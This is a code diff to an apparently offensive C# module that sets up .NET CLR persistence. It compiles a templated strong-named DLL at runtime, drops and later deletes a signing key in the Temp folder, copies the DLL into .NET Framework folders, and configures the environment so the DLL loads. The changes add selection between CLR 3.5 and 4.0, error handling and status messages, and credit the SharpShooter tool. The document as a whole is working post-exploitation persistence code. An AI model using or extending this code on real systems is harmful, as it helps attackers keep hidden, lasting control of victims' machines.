@@ -71,6 +71,7 @@ namespace Context
 }
 ";
     static string filename = "#FILENAME#";
+    static int clrversion = Int32.Parse("#CLRVERSION#");
 
     public static void Execute(string[] args)
     {
@@ -78,16 +79,19 @@ namespace Context
         {
 
             case "install":
-                AssemblyInfo info35 = InstallCLRPers(filename, keyfile, CLRVersion.Net35);
-                AssemblyInfo info40 = InstallCLRPers(filename, keyfile, CLRVersion.Net40);
-                if (info40 != null)
-                    SetupEnv(info40);
+                if (clrversion == 40)
+                {
+                    AssemblyInfo info40 = InstallCLRPers(filename, keyfile, CLRVersion.Net40);
+
+                    if (info40 != null)
+                        SetupEnv(info40);
+                }
                 else
                 {
+                    AssemblyInfo info35 = InstallCLRPers(filename, keyfile, CLRVersion.Net35);
                     if (info35 != null)
                         SetupEnv(info35);
                 }
-
                 break;
             case "cleanenv":
                 CleanEnv();
@@ -201,7 +205,7 @@ namespace Context
         }
         catch (Exception)
         {
-            Console.WriteLine("[x] Errore getting path");
+            Console.WriteLine("[x] Error getting path");
             return string.Empty;
         }
     }
@@ -238,7 +242,7 @@ namespace Context
         }
         catch (Exception e)
         {
-            Console.WriteLine("[-] File copy error: " + e.Message);
+            Console.WriteLine("[x] File copy error: " + e.Message);
             return false;
         }
 
@@ -246,42 +250,53 @@ namespace Context
 
     private static void DropKeyFile(string directory, byte[] keyfile)
     {
+        Console.WriteLine("[*] Drop key on disk");
         File.WriteAllBytes(Path.Combine(directory, "key.snk"), keyfile);
     }
 
     private static AssemblyInfo InstallCLRPers(string filename, string keyfileBase64, CLRVersion ver)
     {
         //Create dll
-        string[] refs = new string[] { "mscorlib.dll", "System.dll" };
-        string outputfile = BuildDll(source, refs, filename, keyfileBase64);
-        byte[] outputbyte = File.ReadAllBytes(outputfile);
-        AssemblyInfo info = GetAssemblyInfo(outputbyte);
-
-        if (string.IsNullOrEmpty(info.publickey))
+        AssemblyInfo info = null;
+        try
         {
-            Console.WriteLine("[-] The assembly is not strong-name");
-            return null;
-        }
+            string[] refs = new string[] { "mscorlib.dll", "System.dll" };
+            string outputfile = BuildDll(source, refs, filename, keyfileBase64, ver);
+            if (!string.IsNullOrEmpty(outputfile))
+            {
+                byte[] outputbyte = File.ReadAllBytes(outputfile);
+                info = GetAssemblyInfo(outputbyte);
 
-        if (ver == CLRVersion.Net35)
-        {
-            string firstPath = GetFirstPath(info, CLRVersion.Net35);
-            Console.WriteLine("[*] .Net Framework < 4.0 folder: " + firstPath);
-            Console.WriteLine("[*]");
-            //Move the DLL into the created folder
-            if (!FileCopy(filename, outputbyte, firstPath))
-                return null;
-        }
-        else
-        {
-            string secondPath = GetFirstPath(info, CLRVersion.Net40);
-            Console.WriteLine("[*] .Net Framework >= 4.0 folder: " + secondPath);
-            Console.WriteLine("[*]");
-            //Move the DLL into the created folder
-            if (!FileCopy(filename, outputbyte, secondPath))
-                return null;
-        }
+                if (string.IsNullOrEmpty(info.publickey))
+                {
+                    Console.WriteLine("[-] The assembly is not strong-name");
+                    return null;
+                }
 
+                if (ver == CLRVersion.Net35)
+                {
+                    string firstPath = GetFirstPath(info, CLRVersion.Net35);
+                    Console.WriteLine("[*] .Net Framework < 4.0 folder: " + firstPath);
+                    Console.WriteLine("[*]");
+                    //Move the DLL into the created folder
+                    if (!FileCopy(filename, outputbyte, firstPath))
+                        return null;
+                }
+                else
+                {
+                    string secondPath = GetFirstPath(info, CLRVersion.Net40);
+                    Console.WriteLine("[*] .Net Framework >= 4.0 folder: " + secondPath);
+                    Console.WriteLine("[*]");
+                    //Move the DLL into the created folder
+                    if (!FileCopy(filename, outputbyte, secondPath))
+                        return null;
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine("[x] Error: " + e.Message);
+        }
         return info;
     }
 
@@ -309,41 +324,56 @@ namespace Context
     }
 
 
-    private static string BuildDll(string source, string[] refs, string filename, string keyfileBase64)
+    private static string BuildDll(string source, string[] refs, string filename, string keyfileBase64, CLRVersion ver)
     {
         //https://github.com/mdsecactivebreach/SharpShooter/blob/master/CSharpShooter/SharpShooter.cs
         string tmp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");
         DropKeyFile(tmp, DecompressDLL(Convert.FromBase64String(keyfileBase64)));
-        Dictionary<string, string> compilerInfo = new Dictionary<string, string>();
-        compilerInfo.Add("CompilerVersion", "v4.0");
-        CSharpCodeProvider provider = new CSharpCodeProvider(compilerInfo);
-        CompilerParameters cp = new CompilerParameters();
-
-        foreach (string r in refs)
-            cp.ReferencedAssemblies.Add(r);
-
-        cp.GenerateExecutable = false;
-        cp.GenerateInMemory = false;
-        cp.OutputAssembly = Path.Combine(tmp, filename);
-        cp.CompilerOptions = "/keyfile:" + Path.Combine(tmp, "key.snk");
-
-        cp.TempFiles = new TempFileCollection(tmp, false);
-
-        CompilerResults results = provider.CompileAssemblyFromSource(cp, source);
-        if (results.Errors.HasErrors)
+        string outname = string.Empty;
+        try
         {
-            StringBuilder sb = new StringBuilder();
+            Dictionary<string, string> compilerInfo = new Dictionary<string, string>();
+            if(ver == CLRVersion.Net40)
+                compilerInfo.Add("CompilerVersion", "v4.0");
+            else
+                compilerInfo.Add("CompilerVersion", "v3.5");
 
-            foreach (CompilerError error in results.Errors)
+            CSharpCodeProvider provider = new CSharpCodeProvider(compilerInfo);
+            CompilerParameters cp = new CompilerParameters();
+
+            foreach (string r in refs)
+                cp.ReferencedAssemblies.Add(r);
+
+            cp.GenerateExecutable = false;
+            cp.GenerateInMemory = false;
+            cp.OutputAssembly = Path.Combine(tmp, filename);
+            cp.CompilerOptions = "/keyfile:" + Path.Combine(tmp, "key.snk");
+
+            cp.TempFiles = new TempFileCollection(tmp, false);
+
+            CompilerResults results = provider.CompileAssemblyFromSource(cp, source);
+            if (results.Errors.HasErrors)
             {
-                sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
-            }
+                StringBuilder sb = new StringBuilder();
 
-            throw new InvalidOperationException(sb.ToString());
+                foreach (CompilerError error in results.Errors)
+                {
+                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
+                }
+
+                throw new InvalidOperationException(sb.ToString());
+            }
+            outname = Path.Combine(tmp, filename);
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine("[x] Error building assembly: " + e.Message);
+            outname = "";
         }
 
         File.Delete(Path.Combine(tmp, "key.snk"));
+        Console.WriteLine("[*] Cleanup");
 
-        return Path.Combine(tmp, filename);
+        return outname;
     }
 }
